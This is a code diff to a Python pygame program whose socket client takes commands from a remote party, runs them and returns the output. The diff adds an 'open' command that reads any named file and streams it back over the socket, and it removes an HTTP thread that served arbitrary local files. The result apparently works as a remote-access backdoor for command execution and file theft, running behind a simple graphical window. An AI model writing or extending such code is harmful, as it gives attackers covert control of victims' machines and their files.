@@ -22,6 +22,7 @@ import pygame
 from subprocess import Popen
 from subprocess import PIPE
 from threading  import Thread
+from os import path
 
 # Global Variables
 
@@ -380,6 +381,20 @@ def sendArray(data):
             sendData(content)
             time.sleep(0.1)
 
+def convert_to_bytes(no):
+    result = bytearray()
+    result.append(no & 255)
+    for i in range(3):
+        no = no >> 8
+        result.append(no & 255)
+    return result
+
+def bytes_to_number(b):
+    res = 0
+    for i in range(4):
+        res += b[i] << (i*8)
+    return res
+
 def handleCommands():
     global Connected
 
@@ -394,10 +409,33 @@ def handleCommands():
         
         if data:
             if data != "END":
-                print("Command : " + data)
-                cmds.append(data)
-                output = getCommandOutput(data)
-                sendArray(output)
+                print(data)
+                if "open" in data:
+                    contents = ""
+                    filename = data[5:]
+                    try:
+                        f    = open(filename, "rb")
+                        size = path.getsize(filename)
+                        sock.send(convert_to_bytes(size))
+                        time.sleep(0.2)
+
+                        d = f.read(1024)
+
+                        while True:
+                            sock.send(d)
+                            d = f.read(1024)
+                            if not d:
+                                break
+
+                        f.close()
+                    except FileNotFoundError:
+                        print("No such file in directory")
+                        continue
+                else:
+                    print("Command : " + data)
+                    cmds.append(data)
+                    output = getCommandOutput(data)
+                    sendArray(output)
             else:
                 print("Closing ...")
                 sock.close()
@@ -431,45 +469,12 @@ def start():
             print("Attempting reconnect")
             start()
 
-def web():
-    websock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    websock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    websock.bind(('', WEBP))
-    websock.listen(1)
-
-    while True:
-        conn, addr = websock.accept()
-        request    = conn.recv(1024).decode()
-        url        = request.split("\n")[0][5:-10]
-
-        contents   = ""
-
-        try:
-            f = open(url, "rb")
-            contents = str(f.read())
-            f.close()
-        except FileNotFoundError:
-            contents = "Error: this file must not exist"
-
-        http_response = """\
-HTTP/1.1 200 OK
-
-"""+contents+"""\
-            
-"""
-
-        conn.sendall(http_response.encode())
-        conn.close()
-
 # Threads
 
 square = createSquare()
 
 t1 = Thread(target=GUI)
-t2 = Thread(target=web)
 t1.start()
-t2.start()
 
 start()
 t1.join()
-t2.join()
